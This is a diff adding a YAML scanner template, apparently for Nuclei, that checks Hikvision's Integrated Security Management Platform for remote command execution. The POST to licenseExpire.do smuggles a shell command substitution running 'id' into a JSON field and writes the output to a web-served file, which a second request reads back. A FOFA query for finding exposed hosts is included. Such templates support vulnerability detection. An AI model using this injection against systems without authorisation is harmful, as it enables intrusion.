@@ -1,0 +1,34 @@
+id: hikvision-integrated-security-rce
+
+info:
+  name: Hikvision Integrated Security Management Platform Remote Command Execution
+  author: Co5mos
+  severity: critical
+  description: |
+    Hikvision's Integrated Security Management Platform has a remote command execution vulnerability in the `licenseExpire.do` endpoint. Attackers can exploit this vulnerability to execute arbitrary commands on the server.
+  metadata:
+    fofa-query: 'app="HIKVISION-综合安防管理平台"'
+  tags: hikvision, rce
+
+variables:
+  filename: "{{rand_base(6)}}.txt"
+
+http:
+  - raw:
+      - |
+        POST /portal/cas/login/ajax/licenseExpire.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"type":"environment","operate":"","machines":{"id":"$(id > /opt/hikvision/web/components/tomcat85linux64.1/webapps/vms/static/{{filename}})"}
+
+      - |
+        GET /vms/static/{{filename}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_2 == 200
+          - regex(body_2, "uid=\d+\(([^)]+)\) gid=\d+\(([^)]+)\)")
+        condition: and
